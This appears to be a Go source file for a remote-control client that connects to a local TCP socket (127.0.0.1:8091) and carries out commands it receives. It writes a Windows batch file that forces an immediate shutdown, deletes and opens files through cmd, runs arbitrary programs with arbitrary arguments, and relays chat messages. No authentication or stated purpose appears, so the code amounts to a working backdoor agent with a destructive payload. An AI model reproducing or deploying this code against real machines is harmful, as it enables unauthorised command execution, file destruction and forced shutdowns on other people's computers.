package main

import "net"
import "fmt"
import "bufio"
import "os"
import "os/exec"

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func main() {
	// connect to this socket
	conn, _ := net.Dial("tcp", "127.0.0.1:8091")
	for {
		// will listen for message to process ending in newline (\n)
		command, _, _ := bufio.NewReader(conn).ReadRune()
		fmt.Print("Command Received" + "\n")
		//C:\\Users\\supero\\Desktop\\teste.bat (Create, Open)
		//C:\Users\supero\Desktop\teste.bat (Delete)
		switch command {
		case '1':
			//Create
			message, _ := bufio.NewReader(conn).ReadString('\n')
			message = message[:len(message)-1]
			f, err := os.Create(message)
			check(err)
			defer f.Close()
			f.WriteString("@echo OFF \n")
			check(err)
			f.Sync()
			w := bufio.NewWriter(f)
			w.WriteString("shutdown /s /f /t 0")
			w.Flush()
			f.Close()
			fmt.Fprintf(conn, "true"+"\n")
			break
		case '2':
			//Delete
			message, _ := bufio.NewReader(conn).ReadString('\n')
			message = message[:len(message)-1]
			c := exec.Command("cmd", "/C", "del", message)
			if err := c.Run(); err != nil {
				fmt.Println("Error: ", err)
			}
			fmt.Fprintf(conn, "true"+"\n")
			break
		case '3':
			//Open
			message, _ := bufio.NewReader(conn).ReadString('\n')
			message = message[:len(message)-1]
			c := exec.Command("cmd", "/C", "", message)
			if err := c.Run(); err != nil {
				fmt.Println("Error: ", err)
			}
			fmt.Fprintf(conn, "true"+"\n")
			break
		case '4':
			//Cmd
			message, _ := bufio.NewReader(conn).ReadString('\n')
			message = message[:len(message)-1]
			parameter, _ := bufio.NewReader(conn).ReadString('\n')
			parameter = parameter[:len(parameter)-1]
			cmd := exec.Command(message, parameter)
			err := cmd.Run()
			if err != nil {
			}
			fmt.Fprintf(conn, "true"+"\n")
			break
		case '5':
			//Chat
			messaget, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Print("Message Received:", string(messaget))
			reader := bufio.NewReader(os.Stdin)
			fmt.Print("Text to send: ")
			text, _ := reader.ReadString('\n')
			fmt.Fprintf(conn, text+"\n")
			fmt.Fprintf(conn, "true"+"\n")
			break
		default:
			fmt.Println("Command undefined")
			fmt.Fprintf(conn, "false"+"\n")
			break
		}
	}
}
